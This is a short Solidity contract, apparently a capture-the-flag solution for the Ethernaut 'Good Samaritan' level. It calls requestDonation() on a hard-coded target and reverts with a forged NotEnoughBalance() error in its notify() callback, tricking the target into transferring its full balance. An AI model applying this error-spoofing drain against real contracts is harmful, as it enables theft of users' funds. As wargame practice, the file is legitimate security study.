// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface GoodSamaritan {
    function coin() external view returns (Coin);
    function requestDonation() external returns (bool enoughBalance);
}
contract Coin {
    mapping(address => uint256) public balances;
}
contract exploit {
    GoodSamaritan target = GoodSamaritan(0x8b1B901Cdd8e44D07bE345D46bb65D2A7086AB73);
    bool flag;
    error NotEnoughBalance();
    
    function attack() public {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if (Coin(target.coin()).balances(address(this)) < 10 ** 5)
            revert NotEnoughBalance();  
    }
}
